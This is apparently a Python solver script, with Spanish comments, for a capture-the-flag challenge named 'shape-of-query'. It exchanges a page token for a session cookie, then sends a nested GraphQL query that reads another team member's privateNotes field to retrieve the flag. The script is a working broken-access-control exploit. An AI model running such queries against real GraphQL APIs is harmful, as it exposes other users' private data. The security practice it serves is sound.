#!/usr/bin/env python3
import json, re, requests, sys

# Configuración
GET_TOKEN    = 'https://pointeroverflowctf.com/challenges/shape-of-query/'
LOGIN_TOKEN  = 'https://shape-of-query.pointeroverflowctf.com/session/exchange'
ENDPOINT     = 'https://shape-of-query.pointeroverflowctf.com/graphql'
COOKIE       = 'session=... cookie de sesion ...' 

HEADERS = {"Cookie": COOKIE, "Content-Type": "application/json"}

# Payload
PAYLOAD = {"query": "{me{id,team{id,members{id,privateNotes}}}}"}

def main():
    print("PASO 1 - Obtener TOKEN")
    r = requests.get(GET_TOKEN, headers=HEADERS)
    if r.status_code != 200:
        print(f"Error al acceder al endpoint: {r.status_code}")
        sys.exit(1)
    print(f"Acceso exitoso. Status: {r.status_code}")
    # print(f"Response: {r.text}")

    m = re.search(r'<div class="token-block">\s*([^<]+?)\s*</div>', r.text)
    token = m.group(1) if m else None
    print(f"Token: {token}")

    print("\nPASO 2 - Obtener nueva cookie para usar en el frontend")
    r = requests.post(LOGIN_TOKEN, json={"token": token}, headers=HEADERS)
    if r.status_code != 200:
        print(f"Error al enviar el token: {r.status_code}")
        sys.exit(1)
    # print(f"Token enviado exitosamente. Status: {r.status_code}")
    # print(f"Response: {r.text}")

    new_cookie = r.headers.get("Set-Cookie")
    if not new_cookie:
        print("No se recibió nueva cookie de sesión.")
        sys.exit(1)
    print(f"New cookie: {new_cookie}")
    HEADERS["Cookie"] = new_cookie

    print("\nPASO 3 - Enviar consulta GraphQL para obtener la flag")

    r = requests.post(ENDPOINT, headers=HEADERS, json=PAYLOAD)
    if r.status_code != 200:
        print(f"Error al enviar la consulta: {r.status_code}")
        sys.exit(1)
    print(f"Consulta enviada exitosamente. Status: {r.status_code}\n")
    # print(f"Response: \n{json.dumps(r.json(), indent=4)}")

    flag = r.json().get("data", {}).get("me", {}).get("team", {}).get("members", [])[1].get("privateNotes", "")
    if flag:
        print(f"Flag encontrada: {flag}")
    else:
        print("No se encontró la flag en la respuesta.")

if __name__ == "__main__":
    main()
